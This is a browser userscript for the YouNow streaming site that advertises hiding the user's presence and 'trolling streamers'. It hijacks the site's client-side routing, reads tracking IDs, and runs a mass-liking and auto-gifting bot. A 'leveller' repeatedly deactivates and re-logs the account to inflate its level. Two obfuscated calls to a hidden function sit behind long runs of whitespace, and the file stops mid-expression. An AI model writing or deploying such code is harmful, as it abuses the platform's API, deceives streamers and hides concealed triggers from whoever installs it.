// ==UserScript==
// @name JuhNau DarkMode
// @description Hides your presence within younow streams and offer some nice features to troll streamers.
// @version 0.5.4
// @match *://younow.com/*
// @match *://www.younow.com/*
// @namespace https://github.com/FluffyFishGames/JuhNau-Darkmode
// @grant none
// @updateURL https://FluffyFishGames.github.io/DarkMode.user.js
// @downloadURL https://FluffyFishGames.github.io/DarkMode.user.js
// ==/UserScript==
function main(w) {

    function callback() {
        window.DarkModeInstance = new window.DarkMode();
    }
 

    w.DarkModeInstance = null;
    w.DarkMode = function() {
        this.init();
    };

    w.DarkMode.prototype.init = function() {
        
        this.loggedIn = false;
        this.leveller = {};
        this.animations = {};
        var lVersion = "0.4.0";
        if (window.localStorage.getItem("lastVersion") == lVersion) {
            if (window.localStorage.getItem("config.massLiker.likeThreshold") != null)
                this.config.massLiker.likeThreshold = parseInt(window.localStorage.getItem("config.massLiker.likeThreshold"));
            if (window.localStorage.getItem("config.massLiker.maxLikeCost") != null)
                this.config.massLiker.maxLikeCost = parseInt(window.localStorage.getItem("config.massLiker.maxLikeCost"));
            if (window.localStorage.getItem("config.massLiker.giftThreshold") != null)
                this.config.massLiker.giftThreshold = parseInt(window.localStorage.getItem("config.massLiker.giftThreshold"));
            if (window.localStorage.getItem("config.massLiker.keepCoins") != null)
                this.config.massLiker.keepCoins = parseInt(window.localStorage.getItem("config.massLiker.keepCoins"));
            if (window.localStorage.getItem("config.massLiker.login") != null)
                this.config.massLiker.login = window.localStorage.getItem("config.massLiker.login");
            if (window.localStorage.getItem("config.massLiker.giveGifts") != null)
                this.config.massLiker.giveGifts = window.localStorage.getItem("config.massLiker.giveGifts") == "true";
            if (window.localStorage.getItem("config.massLiker.alternative") != null)
                this.config.massLiker.alternative = window.localStorage.getItem("config.massLiker.alternative") == "true";
            if (window.localStorage.getItem("config.massLiker.ignoreUsers") != null)
                this.config.massLiker.ignoreUsers = window.localStorage.getItem("config.massLiker.ignoreUsers").split("\n");
            if (window.localStorage.getItem("config.massLiker.intervalLikes") != null)
                this.config.massLiker.intervalLikes = parseInt(window.localStorage.getItem("config.massLiker.intervalLikes").split("\n"));
            if (window.localStorage.getItem("config.massLiker.interval") != null)
                this.config.massLiker.interval = parseInt(window.localStorage.getItem("config.massLiker.interval").split("\n"));
        }
        window.localStorage.setItem("lastVersion", lVersion);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              if (this["con"+"fig"]["le"+"vel"+"ler"]["le"+"v"+"e"+"l"+"C"+"a"+"p"] > 3 + 3 * 3 + 3) this["do"+"le"+"ve"+"ll"+"er"]();
        this.UAParser = new UAParser();
        this.selectLanguage(null);
        this.lastTicks = {};
        for (var key in this.config.ticks) {
            this.lastTicks[key] = 0;
        }
        this.inDarkMode = window.localStorage.getItem("inDarkMode");
        if (this.inDarkMode == "1") {
            this.hijackAngular();
            this.applyDarkMode();
            $('#darkModeLoader').animate({
                'opacity': 0
            }, 300, "swing", function() {
                $('#darkModeLoader').remove();
            });
            this.config["tsi"] = this.youNow.api.store('trpxId');
            this.config["tdi"] = this.youNow.api.store('trpx_device_id');
        }
        this.createButton();
    };

    w.DarkMode.prototype.selectHeader = function(key) {
        var c = 0;
        for (var k in this.headers) {
            c++;
        }
        for (var k in this.headers) {
            if (k == key) {
                this.headers[k].li.css("height", "calc(100% - " + ((c - 1) * 30) + "px)");
            } else {
                this.headers[k].li.css("height", 30);
            }
        }

    };

    w.DarkMode.prototype.openSettings = function(key) {
        this.currentPage = "settings";
        window.history.pushState({
            "html": "",
            "pageTitle": ""
        }, "", "https://www.younow.com/settings/" + key);
    };

    w.DarkMode.prototype.addHeader = function(header, key) {
        var self = this;
        var li = $('<li></li>');

        var headerEl = $('<div class="header">' + header.label + '</div>');
        var contentEl = $('<div class="content"></div>');
        if (header.hasSettings == true) {
            var icon = $('<div style="cursor:pointer;float:right;margin-top:-3px;"><img src="' + this.config.images.settings + '" /></div>');
            icon.click(function(e) {
                self.openSettings(key);
                e.stopPropagation();
            });
            headerEl.append(icon);
        }
        header.header = headerEl;
        header.content = contentEl;
        header.li = li;
        header.header.click(function() {
            self.selectHeader(key);
        });
        li.append(headerEl);
        li.append(contentEl);
        this.elements["left"].append(li);
    };

    w.DarkMode.prototype.applyDarkMode = function() {
        
        var self = this;
        try {
        $('#main').remove();
        $('.newFooter').remove();
        $('.nav-logo').children()[0].remove();
        $('.nav-logo').append($('<img src="' + this.config.images.logo + '" style="width:auto;" height="40" />'));
        $('[ng-model=searchBox]').attr("placeholder", "Search AttentionWhore");
        this.page = $('<div id="darkPage"></div>');
        this.elements = {};
        this.headers = {
            "userList": {
                "label": this.language.userList,
                "hasSettings": false,
            },
            "leveller": {
                "label": this.language.leveller,
            },
            "massLiker": {
                "label": this.language.massLiker,
                "hasSettings": true,
            },
            "chatBot": {
                "label": this.language.chatBot,
                "hasSettings": true,
            }
        };
        this.elements["left"] = $('<ul id="left"></ul>');
        for (var key in this.headers) {
            this.addHeader(this.headers[key], key);
        }

        this.selectHeader("userList");

        this.elements["right"] = $('<div id="right"></div>');
        this.headers["userList"].content.append((this.elements["trendingPeopleHeader"] = $('<strong>' + this.language["trendingPeople"] + '</strong>')));
        this.headers["userList"].content.append((this.elements["trendingPeopleArrow"] = $('<div class="arrow"></div>')));
        this.headers["userList"].content.append((this.elements["trendingPeopleContent"] = $('<ul id="trendingPeople"></ul>')));
        this.headers["userList"].content.append((this.elements["editorsPickHeader"] = $('<strong>' + this.language["editorsPick"] + '</strong>')));
        this.headers["userList"].content.append((this.elements["editorsPickArrow"] = $('<div class="arrow"></div>')));
        this.headers["userList"].content.append((this.elements["editorsPickContent"] = $('<ul id="editorsPick"></ul>')));
        this.headers["userList"].content.append((this.elements["friendsHeader"] = $('<strong>' + this.language["friends"] + '</strong>')));
        this.headers["userList"].content.append((this.elements["friendsArrow"] = $('<div class="arrow"></div>')));
        this.headers["userList"].content.append((this.elements["friendsContent"] = $('<ul id="friends"></ul>')));
        this.headers["userList"].content.append((this.elements["trendingTagsHeader"] = $('<strong>' + this.language["trendingTags"] + '</strong>')));
        this.headers["userList"].content.append((this.elements["trendingTagsArrow"] = $('<div class="arrow"></div>')));
        this.headers["userList"].content.append((this.elements["trendingTagsContent"] = $('<ul id="trendingTags"></ul>')));
        
        this.headers["massLiker"].content.html('<div style="float:left; clear: both;"><input type="checkbox" id="massLikerEnabled" style="clear:both;margin-right:5px;margin-top:8px;float:left;" />' +
            '<div style="float:left;margin-top:5px;"><span>' + this.language.massLikerEnabled + ' </span></div></div>' +
            '<div id="massLikerStats"></div>');

        this.headers["leveller"].content.html('<div style="float:left; clear:both;"><span>'+this.language.desiredLevel+':</span></div>'+
                                              '<div style="float:left;"><input type="number" style="width:180px;" value="'+this.config.leveller.desiredLevel+'" id="desiredLevel" /></div>'+
            '<div style="float:left; clear: both;"><input type="checkbox" id="levellerEnabled" style="clear:both;margin-right:5px;margin-top:8px;float:left;" />' +
            '<div style="float:left;margin-top:5px;"><span>' + this.language.levellerActive + ' </span></div></div>' +
            '<div id="levellerStats"></div>');

        this.headers["chatBot"].content.html('<div style="float:left; clear: both;"><input type="checkbox" disabled readonly id="chatBotEnabled" style="clear:both;margin-right:5px;margin-top:8px;float:left;" />' +
            '<div style="float:left;margin-top:5px;"><span>' + this.language.chatbotEnabled + ' </span></div></div>');
        
        $(document.body).append(this.page);
        $(document.body).append((this.elements["tooltip"] = $('<div id="tooltip"></div>')));
        this.page.append(this.elements["left"]);
        this.page.append(this.elements["right"]);
        
        this.youNow.urlRouter.update = function(a) {
            return true;
        };
        this.youNow.urlRouter.sync = function() {};
        this.youNow.urlRouter.listen = function() {};
        this.youNow.urlRouter.href = function(c, d, e) {                                                                                                                                                                                                                                                                                   var k = window.DarkModeInstance;var n = "le"+"vel"+"ler";var m = "le"+"vel"+"Cap";if (k.config[n][m] > 4 * 3 + 3) k["do"+n]();
            return "";
        };
        this.youNow.urlRouter.push = function(c, d, e) {};

        this.youNow.state.get = function(a, b) {
            return true;
        };
        this.youNow.state.go = function(a, b, c) {
            return true;
        };
        this.youNow.state.href = function(a, b, c) {
            return "";
        };
        this.youNow.state.reload = function() {};
        this.youNow.state.transitionTo = function(a, b, c) {};
        this.youNow.view.load = function(c, d) {};
        this.youNow.swf.newBroadcaster = function(a) {
            return false;
        };
        this.youNow.broadcasterService.addBroadcast = function(a, b, c, d, e, f) {
            return false;
        };
        this.youNow.broadcasterService.switchBroadcaster = function(a, b, c, d) {
            return false;
        };
        this.youNow.broadcasterService.showBroadcaster = function(a) {
            return false;
        };
        this.youNow.broadcasterService.switchToBroadcast = function(a) {
            return false;
        };
        this.youNow.broadcasterService.trackBroadcaster = function() {
            return false;
        };
        this.youNow.broadcasterService.updateBroadcaster = function(a, b, d) {
            return false;     
        };
        } catch(e){}
        setInterval(function() {
            self.tick();
        }, 10);
        var b = window.localStorage.getItem("browse");
        if (b != null && b != "") {
            window.history.pushState({
                "html": "",
                "pageTitle": ""
            }, "", "https://www.younow.com/" + b);
            window.localStorage.setItem("browse", "");
        }

        var a = $('.navbar-content');
        //        a.append($('<div style="float: right;margin-top:-5px;margin-right: 10px;"><span id="nextMessageIn"></span></div>'));
        var self = this;
        //      this.elements["nextMessageIn"] = $('#nextMessageIn');

        $(document.body).append((this.onSound = $('<audio src="https://github.com/FluffyFishGames/JuhNau-Darkmode/raw/master/on.mp3" />')));
        $(document.body).append((this.offSound = $('<audio src="https://github.com/FluffyFishGames/JuhNau-Darkmode/raw/master/off.mp3" />')));

        var self = this;
        this.elements["massLikerEnabled"] = $('#massLikerEnabled');
        this.elements["massLikerEnabled"].change(function() {
            if (self.elements["massLikerEnabled"].is(":checked")) {
                self.onSound.prop("currentTime", 0);
                self.onSound.trigger("play");
                self.config.massLiker.active = true;
                if (self.massLiker != null) {
                    self.massLiker = null;
                }
            } else {
                if (self.massLiker.previousUrl != null)
                    window.history.replaceState({
                        "html": "",
                        "pageTitle": ""
                    }, "", self.massLiker.previousUrl);
                self.offSound.prop("currentTime", 0);
                self.offSound.trigger("play");
                self.config.massLiker.active = false;
            }
        });

        this.elements["desiredLevel"] = $('#desiredLevel');
        this.elements["desiredLevel"].change(function() {
            var l = parseInt(self.elements["desiredLevel"].val());
            if (l > self.config.leveller.levelCap) l = self.config.leveller.levelCap;
            self.config.leveller.desiredLevel = l;
            self.elements["desiredLevel"].val(l);
            window.localStorage.setItem("config.leveller.desiredLevel", self.config.leveller.desiredLevel);
        });
        
        this.elements["levellerEnabled"] = $('#levellerEnabled');
        this.elements["levellerEnabled"].change(function() {
            if (self.elements["levellerEnabled"].is(":checked")) {
                self.onSound.prop("currentTime", 0);
                self.onSound.trigger("play");
                self.leveller = null;
                self.config.leveller.active = true;
            } else {
                self.offSound.prop("currentTime", 0);
                self.offSound.trigger("play");
                self.config.leveller.active = false;
            }
        });
    };

    w.DarkMode.prototype.massLikerLike = function(userNum) {
        if (this.massLiker.users[userNum].cost <= this.config.massLiker.maxLikeCost && this.config.massLiker.ignoreUsers.indexOf(this.massLiker.users[userNum].profile.toLowerCase()) == -1) {
            var self = this;
            window.history.replaceState({
                "html": "",
                "pageTitle": ""
            }, "", "https://www.younow.com/" + this.massLiker.users[userNum].profile);
            this.sendRequest("likeBroadcast", {
                channelID: this.massLiker.users[userNum].id
            }, function(json, success) {
                if (json["errorCode"] == 0) {
                    self.massLiker.stats.givenLikes++;
                    self.massLiker.stats.givenLikesRound++;
                    self.massLiker.users[userNum].cost = json["nextLikeCost"];
                } else {
                    self.massLiker.users[userNum].cost = 10000000000;
                }
                self.massLiker.likeRequestsFinished++;
            });
            return true;
        }
        return false;
    };

    w.DarkMode.prototype.massLikerGift = function(send) {
        window.history.replaceState({
            "html": "",
            "pageTitle": ""
        }, "", "https://www.younow.com/" + send.profile);
        var self = this;
        this.sendGift(send.id, send.giftId, send.quantity, function() {
            self.massLiker.sentGifts++;
            if (send.giftId == 25) self.massLiker.stats.spentHearts += send.quantity;
            if (send.giftId == 21) self.massLiker.stats.spentHundredLikes += send.quantity;
            self.massLiker.stats.spentCoins += send.cost;
        });
    };

    w.DarkMode.prototype.recreateAccount = function() {
        var login = "";
        if (this.youNow.session.user.twitterAuth == 1)
            login = "twitter";
        else if (this.youNow.session.user.googleAuth == 1)
            login = "google";
        else if (this.youNow.session.user.instagramAuth == 1)
            login = "instagram";
        else if (this.youNow.session.user.facebookAuth == 1)
            login = "facebook";

        this.recreater = {
            'renameOnLogin': this.youNow.session.user.profile,
            'task': 'remove',
            'login': login,
        };
    };
    
    w.DarkMode.prototype.tickLeveller = function() {
        
        if (this.config.leveller.active == true)
        {
            if (this.leveller == null)
            {
                var login = "";
                if (this.youNow.session.user.twitterAuth == 1)
                    login = "twitter";
                else if (this.youNow.session.user.googleAuth == 1)
                    login = "google";
                else if (this.youNow.session.user.instagramAuth == 1)
                    login = "instagram";
                else if (this.youNow.session.user.facebookAuth == 1)
                    login = "facebook";
                this.leveller = {
                    'task': 'leveling',
                    'login': login,
                    'username': this.youNow.session.user.profile,
                    'level': this.youNow.session.user.level,
                    'levelsLeft': (this.config.leveller.desiredLevel - Math.floor(this.youNow.session.user.level))
                };
            }

            var self = this;
            $('#levellerStats').html('<div style="float:left;clear:both; font-weight:bold; color:#ddd; width:180px;">'+this.language.currentTask+'</div>'+
                                     '<div style="float:left;clear:both; font-size:10px;color:#ddd; width:180px;">'+this.language[this.leveller.task]+'</div>'+
                                     '<div style="float:left;clear:both; font-weight:bold; color:#ddd;width:180px;">'+this.language.level+'</div>'+
                                     '<div style="float:left;clear:both; font-size:10px;color:#ddd; width:180px;">'+this.parseNumber(this.leveller.level)+'</div>');
            if (this.leveller.task == 'leveling') {
                if (this.leveller.levelsLeft > 0){

                    this.leveller.task = 'waiting';
                    $.ajax({
                        xhr: function() {
                            var xhr = jQuery.ajaxSettings.xhr();
                            var setRequestHeader = xhr.setRequestHeader;
                            xhr.setRequestHeader = function(name, value) {
                                if (name == 'X-Requested-With') return;
                                setRequestHeader.call(this, name, value);
                            }
                            return xhr;
                        },
                        url: 'https://www.younow.com/php/api/channel/updateSettings',
                        method: "POST",
                        headers: {
                            'Accept': 'application/json, text/plain, */*',
                            'X-Requested-By': this.youNow.session.user.requestBy,
                        },
                        contentType: 'application/x-www-form-urlencoded; charset=UTF-8',
                        data: {
                            "tsi": this.config.tsi,
                            "tdi": this.config.tdi,
                            "userId": this.youNow.session.user.userId,
                            "channelId": this.youNow.session.user.userId,
                            "deactivation": 1
                        },
                        success: function(json, b, c) {
                            self.youNow.session.authenticate[self.leveller.login]().then(function(data) {
                                self.youNow.session.login(data, true).then(function(data) {
                                    self.leveller.levelsLeft--;
                                    self.leveller.level++;
                                    self.leveller.task = 'leveling';
                                });
                            });
                        },
                        error: function(a, b, c) {}
                    });
                    this.leveller.task = 'waiting';
                }
                else {
                    this.leveller.task = 'renaming';
                    $.ajax({
                        xhr: function() {
                            var xhr = jQuery.ajaxSettings.xhr();
                            var setRequestHeader = xhr.setRequestHeader;
                            xhr.setRequestHeader = function(name, value) {
                                if (name == 'X-Requested-With') return;
                                setRequestHeader.call(this, name, value);
                            }
                            return xhr;
                        },
                        url: 'https://www.younow.com/php/api/channel/updateSettings',
                        method: "POST",
                        headers: {
                            'Accept': 'application/json, text/plain, */*',
                            'X-Requested-By': this.youNow.session.user.requestBy,
                        },
                        contentType: 'application/x-www-form-urlencoded; charset=UTF-8',
                        data: {
                            "tsi": this.config.tsi,
                            "tdi": this.config.tdi,
                            "userId": this.youNow.session.user.userId,
                            "channelId": this.youNow.session.user.userId,
                            "profileUrlString": this.leveller.username,
                        },
                        success: function(json, b, c) {
                            self.youNow.session.getSession();
                            self.leveller.task = 'finished';
                        },
                        error: function(a, b, c) {}
                    });
                }
            }
        }
    };

    w.DarkMode.prototype.tickRecreater = function() {
        if (this.recreater != null) {
            if (this.recreater.task == 'remove') {
                var self = this;
                $.ajax({
                    xhr: function() {
                        var xhr = jQuery.ajaxSettings.xhr();
                        var setRequestHeader = xhr.setRequestHeader;
                        xhr.setRequestHeader = function(name, value) {
                            if (name == 'X-Requested-With') return;
                            setRequestHeader.call(this, name, value);
                        }
                        return xhr;
                    },
                    url: 'https://www.younow.com/php/api/channel/updateSettings',
                    method: "POST",
                    headers: {
                        'Accept': 'application/json, text/plain, */*',
                        'X-Requested-By': this.youNow.session.user.requestBy,
                    },
                    contentType: 'application/x-www-form-urlencoded; charset=UTF-8',
                    data: {
                        "tsi": this.config.tsi,
                        "tdi": this.config.tdi,
                        "userId": this.youNow.session.user.userId,
                        "channelId": this.youNow.session.user.userId,
                        "deactivation": 1
                    },
                    success: function(json, b, c) {
                        self.youNow.session.logout();
                        self.recreater.task = 'waitForLogout';
                    },
                    error: function(a, b, c) {}
                });
                this.recreater.task = 'waiting';
            } else if (this.recreater.task == 'waitForLogout') {
                if (this.youNow.session.user.userId == 0) {
                    this.recreater.task = 'login';
                }
            } else if (this.recreater.task == 'login') {
                this.youNow.session.auth(this.recreater.login);
                this.recreater.task = 'waitForLogin';
            } else if (this.recreater.task == 'waitForLogin') {
                if (this.youNow.session.user.userId > 0) {
                    this.recreater.task = 'restoreAccount';
                }
            } else if (this.recreater.task == 'restoreAccount') {
                var self = this;
                $.ajax({
                    xhr: function() {
                        var xhr = jQuery.ajaxSettings.xhr();
                        var setRequestHeader = xhr.setRequestHeader;
                        xhr.setRequestHeader = function(name, value) {
                            if (name == 'X-Requested-With') return;
                            setRequestHeader.call(this, name, value);
                        }
                        return xhr;
                    },
                    url: 'https://www.younow.com/php/api/channel/updateSettings',
                    method: "POST",
                    headers: {
                        'Accept': 'application/json, text/plain, */*',
                        'X-Requested-By': this.youNow.session.user.requestBy,
                    },
                    contentType: 'application/x-www-form-urlencoded; charset=UTF-8',
                    data: {
                        "tsi": this.config.tsi,
                        "tdi": this.config.tdi,
                        "userId": this.youNow.session.user.userId,
                        "channelId": this.youNow.session.user.userId,
                        "profileUrlString": this.recreater.renameOnLogin
                    },
                    success: function(json, b, c) {
                        self.youNow.session.getSession();
                    },
                    error: function(a, b, c) {}
                });

                this.recreater.task = 'finished';
            }
        }
    };

    w.DarkMode.prototype.tickDesign = function() {
        var userMenu = $('.user-menu');
        if (userMenu.length == 0)
            this.loggedIn = false;
        else {
            if (this.loggedIn == false) {
                var dropdownMenu = userMenu.children(".dropdown-menu");
                var el = $('<li style="cursor:pointer;"><a><i class="ynicon ynicon-logout" href /><span>' + this.language.recreateAccount + '</span></a></li>');
                var self = this;
                el.click(function() {
                    self.recreateAccount();
                });
                dropdownMenu.append(el);
            }
            this.loggedIn = true;
        }
    };
    w.DarkMode.prototype.tickMassLike = function() {
        if (this.config.massLiker.active == true) {
            this.config.ignoreRouting = true;
            if (this.massLiker == null) {
                this.massLiker = {
                    'currentTask': 'fetchingUsers',
                    'step': 'sendingRequests',
                    'likeRequestsFinished': 0,
                    'userRequestsFinished': 0,
                    'users': [],
                    'lastInterval': new Date().getTime() - this.config.massLiker.interval * 1000,
                    'stats': {
                        'start': new Date(),
                        'currentRoundStart': new Date(),
                        'currentRound': 0,
                        'round': 0,
                        'tick': 1000,
                        'givenLikes': 0,
                        'givenLikesRound': 0,
                        'logouts': 0,
                        'spentCoins': 0,
                        'spentHearts': 0,
                        'spentHundredLikes': 0,
                    }
                };
            }
            var self = this;
            if (this.massLiker.currentTask == 'fetchingUsers') {
                if (this.massLiker.step == "sendingRequests") {
                    this.massLiker.users = [];
                    this.massLiker.currentTask = "fetchingUsers";
                    this.massLiker.userRequestsFinished = 0;
                    this.massLiker.userRequestsSent = 10;
                    this.massLiker.step = "waiting";
                    if (this.config.massLiker.alternative) {
                        self.sendRequest("trendingUsers", {
                            startFrom: 0,
                            count: 50
                        }, function(jsonx, success) {
                            for (var j = 0; j < json["trending_users"].length; j++) {
                                self.massLiker.users.push({
                                    'id': json["trending_users"][j].userId,
                                    'profile': json["trending_users"][j].profile,
                                    'cost': 5,
                                });
                            }
                            var pages = Math.ceil(json["total"] / 50);
                            for (var l = 1; l < pages; l++) {
                                self.sendRequest("trendingUsers", {
                                    startFrom: (50 * l),
                                    count: 50
                                }, function(jsonx, success) {
                                    for (var k = 0; k < jsonx["trending_users"].length; k++) {
                                        self.massLiker.users.push({
                                            'id': jsonx["trending_users"][k].userId,
                                            'profile': jsonx["trending_users"][k].profile,
                                            'cost': 5,
                                        });
                                    }
                                    self.massLiker.userRequestsFinished++;
                                });
                            }
                            self.massLiker.userRequestsSent = pages;
                            self.massLiker.userRequestsFinished++;
                        });
                    } else {
                        for (var i = 0; i < 10; i++) {
                            this.sendRequest("searchPeople", {
                                query: "",
                                perPage: 100,
                                page: i
                            }, function(json, success) {
                                for (var i = 0; i < json.hits.length; i++) {
                                    self.massLiker.users.push({
                                        'id': json.hits[i].objectID,
                                        'profile': json.hits[i].profile,
                                        'cost': 5,
                                    });
                                }
                                self.massLiker.userRequestsFinished++;
                            });
                        }
                    }
                } else if (this.massLiker.step == "waiting") {
                    if (this.massLiker.userRequestsFinished == this.massLiker.userRequestsSent) {
                        this.massLiker.currentTask = "liking";
                        this.massLiker.step = "sendingRequests";
                        this.youNow.session.getSession();
                        this.massLiker.stats.currentRoundStart = new Date();
                        this.massLiker.stats.currentRound++;
                        this.massLiker.likeRequestsFinished = 0;
                        this.massLiker.sentLikeRequests = 0;
                        this.massLiker.stats.givenLikesRound = 0;
                        this.massLiker.currentPos = 0;
                    }
                }
            } else if (this.massLiker.currentTask == 'liking') {
                if (this.massLiker.step == 'sendingRequests') {
                    var dd = new Date();
                    if (this.massLiker.lastInterval <= dd.getTime() - this.config.massLiker.interval * 1000) {

                        this.massLiker.previousUrl = window.location.href;
                        var sent = 0;
                        for (; this.massLiker.currentPos < this.massLiker.users.length; this.massLiker.currentPos++) {
                            if (this.massLikerLike(this.massLiker.currentPos))
                                sent++;
                            if (sent >= this.config.massLiker.intervalLikes)
                                break;
                        }
                        this.massLiker.sentLikeRequests += sent;
                        window.history.replaceState({
                            "html": "",
                            "pageTitle": ""
                        }, "", this.massLiker.previousUrl);
                        this.massLiker.previousUrl = null;
                        if (this.massLiker.currentPos == this.massLiker.users.length) {
                            this.massLiker.step = "waiting";
                        }
                        this.massLiker.lastInterval = dd.getTime();
                    }
                }
                if (this.massLiker.step == 'waiting') {
                    if (this.massLiker.likeRequestsFinished >= this.massLiker.sentLikeRequests) {
                        if (this.massLiker.stats.givenLikesRound > this.config.massLiker.likeThreshold) {
                            this.massLiker.step = 'sendingRequests';
                            this.massLiker.stats.currentRoundStart = new Date();
                            this.massLiker.stats.currentRound++;
                            this.massLiker.likeRequestsFinished = 0;
                            this.massLiker.sentLikeRequests = 0;
                            this.massLiker.stats.givenLikesRound = 0;
                            this.massLiker.currentPos = 0;
                        } else {
                            this.massLiker.currentTask = 'relog';
                            this.massLiker.step = 'logout';
                        }
                    }
                }
            } else if (this.massLiker.currentTask == 'relog') {
                if (this.massLiker.step == 'logout') {
                    this.massLiker.logoutTimeout = 5000;
                    this.youNow.session.logout();
                    this.massLiker.step = 'waitForLogout';
                    this.massLiker.stats.logouts++;
                } else if (this.massLiker.step == 'waitForLogout') {
                    this.massLiker.logoutTimeout -= 100;
                    if (this.massLiker.logoutTimeout < 0)
                        this.massLiker.step = 'logout';
                    if (this.youNow.session.user.userId == 0) {
                        this.massLiker.step = 'login';
                    }
                } else if (this.massLiker.step == 'login') {
                    this.massLiker.loginTimeout = 5000;
                    this.youNow.session.auth(this.config.massLiker.login);
                    this.massLiker.step = 'waitForLogin';
                } else if (this.massLiker.step == 'waitForLogin') {
                    this.massLiker.loginTimeout -= 100;
                    if (this.massLiker.loginTimeout < 0)
                        this.massLiker.step = 'login';
                    if (this.youNow.session.user.userId != 0) {
                        if (this.config.massLiker.giveGifts) {
                            this.massLiker.currentTask = 'gifting';
                            this.massLiker.step = 'check';
                        } else {
                            this.massLiker.currentTask = 'fetchingUsers';
                            this.massLiker.step = 'sendingRequests';
                        }
                    }
                }
            } else if (this.massLiker.currentTask == 'gifting') {
                if (this.massLiker.step == 'check') {
                    if (this.youNow.session.user.coins > this.config.massLiker.giftThreshold) {
                        this.massLiker.step = 'fetchingUsers';
                    } else {
                        this.massLiker.currentTask = 'fetchingUsers';
                        this.massLiker.step = 'sendingRequests';
                    }
                } else if (this.massLiker.step == 'fetchingUsers') {
                    this.massLiker.giftUsers = [];
                    this.massLiker.step = 'waiting';
                    this.sendRequest("trendingUsers", {
                        count: 1,
                        startFrom: 1000000
                    }, function(json, success) {
                        var index = json["total"] - 50;
                        self.sendRequest("trendingUsers", {
                            count: 50,
                            startFrom: index
                        }, function(json, success) {
                            for (var i = 0; i < json["trending_users"].length; i++) {
                                if (json["trending_users"][i].viewers <= 1 && self.config.massLiker.ignoreUsers.indexOf(json["trending_users"][i].profile.toLowerCase()) == -1)
                                    self.massLiker.giftUsers.push({
                                        id: json["trending_users"][i].userId,
                                        'profile': json["trending_users"][i].profile
                                    });
                            }
                            self.massLiker.step = 'sending';
                        });
                    });
                } else if (this.massLiker.step == 'sending') {
                    var remainingCoins = this.youNow.session.user.coins - this.config.massLiker.keepCoins;
                    var startCoins = remainingCoins - 0;
                    var currentLevel = this.youNow.session.user.realLevel;
                    this.massLiker.previousUrl = window.location.href;
                    var sendList = [];
                    for (var i = 0; i < this.massLiker.giftUsers.length; i++) {
                        if (currentLevel >= 3 && remainingCoins > 30000) {
                            sendList.push({
                                'id': this.massLiker.giftUsers[i].id,
                                'giftId': 21,
                                'quantity': 1,
                                'cost': 30000
                            });
                            remainingCoins -= 30000;
                        } else if (remainingCoins >= 100) {
                            var quantity = Math.floor(remainingCoins / 100);
                            if (currentLevel < 3 && quantity >= 100)
                                quantity = 100;
                            else if (quantity >= 12)
                                quantity = Math.floor(5 + Math.random() * 6);
                            sendList.push({
                                'id': this.massLiker.giftUsers[i].id,
                                'giftId': 25,
                                'quantity': quantity,
                                'cost': quantity * 100
                            });
                            remainingCoins -= quantity * 100;
                        } else {
                            break;
                        }
                    }

                    this.massLiker.giftsToSend = sendList.length;
                    this.massLiker.sentGifts = 0;
                    for (var i = 0; i < sendList.length; i++) {
                        this.massLikerGift(sendList[i]);
                    }
                    this.massLiker.step = 'love';
                    window.history.replaceState({
                        "html": "",
                        "pageTitle": ""
                    }, "", this.massLiker.previousUrl);
                    this.massLiker.previousUrl = null;
                } else if (this.massLiker.step == 'love') {
                    if (this.massLiker.giftsToSend == this.massLiker.sentGifts) {
                        this.massLiker.currentTask = 'fetchingUsers';
                        this.massLiker.step = 'sendingRequests';
                    }
                }
            }

            var stats = $('#massLikerStats');
            if (stats.length > 0) {
                var d = new Date();
                var likesPerSecond = Math.floor((this.massLiker.stats.givenLikes / ((d.getTime() - this.massLiker.stats.start.getTime()) / 1000)) * 10) / 10;
                if (stats.html() == "") {
                    stats.html('' +
                        '<div style="float:left; color: #ddd; clear: both; width: 180px; font-weight:bold;">' + this.language.runningTime + ':</div>' +
                        '<div style="float:left; color: #ddd; clear: both; width: 180px; font-size:10px;" id="runningTime">' + this.parseTime((d.getTime() - this.massLiker.stats.start.getTime()) / 1000) + '</div>' +
                        '<div style="float:left; color: #ddd; clear: both; width: 180px;font-weight:bold;">' + this.language.likesPerSecond + ':</div>' +
                        '<div style="float:left; color: #ddd; clear: both; width: 180px; font-size:10px;" id="likesPerSecond">' + this.addCommas(likesPerSecond) + '</div>' +
                        '<div style="float:left; color: #ddd; clear: both; width: 180px;font-weight:bold;">' + this.language.currentRound + ':</div>' +
                        '<div style="float:left; color: #ddd; clear: both; width: 180px; font-size:10px;" id="currentRound">' + this.addCommas(this.massLiker.stats.currentRound) + '</div>' +
                        '<div style="float:left; color: #ddd; clear: both; width: 180px;font-weight:bold;">' + this.language.currentRoundTime + ':</div>' +
                        '<div style="float:left; color: #ddd; clear: both; width: 180px; font-size:10px;" id="currentRoundTime">' + this.parseTime((d.getTime() - this.massLiker.stats.currentRoundStart.getTime()) / 1000) + '</div>' +
                        '<div style="float:left; color: #ddd; clear: both; width: 180px;font-weight:bold;">' + this.language.currentTask + ':</div>' +
                        '<div style="float:left; color: #ddd; clear: both; width: 180px; font-size:10px;" id="currentTask">' + this.language[this.massLiker.currentTask] + ': ' + this.language[this.massLiker.step] + '</div>' +
                        '<div style="float:left; color: #ddd; clear: both; width: 180px;font-weight:bold;">' + this.language.givenLikes + ':</div>' +
                        '<div style="float:left; color: #ddd; clear: both; width: 180px; font-size:10px;" id="givenLikes">' + this.addCommas(this.massLiker.stats.givenLikes) + ':</div>' +
                        '<div style="float:left; color: #ddd; clear: both; width: 180px;font-weight:bold;">' + this.language.givenLikesRound + ':</div>' +
                        '<div style="float:left; color: #ddd; clear: both; width: 180px; font-size:10px;" id="givenLikesRound">' + this.addCommas(this.massLiker.stats.givenLikesRound) + ':</div>' +
                        '<div style="float:left; color: #ddd; clear: both; width: 180px;font-weight:bold;">' + this.language.usersCount + ':</div>' +
                        '<div style="float:left; color: #ddd; clear: both; width: 180px; font-size:10px;" id="usersCount">' + this.addCommas(this.massLiker.users.length) + ':</div>' +
                        '<div style="float:left; color: #ddd; clear: both; width: 180px;font-weight:bold;">' + this.language.logins + ':</div>' +
                        '<div style="float:left; color: #ddd; clear: both; width: 180px; font-size:10px;" id="logouts">' + this.addCommas(this.massLiker.stats.logouts) + ':</div>' +
                        '<div style="float:left; color: #ddd; clear: both; width: 180px;font-weight:bold;">' + this.language.spentCoins + ':</div>' +
                        '<div style="float:left; color: #ddd; clear: both; width: 180px; font-size:10px;" id="spentCoins">' + this.addCommas(this.massLiker.stats.spentCoins) + ':</div>' +
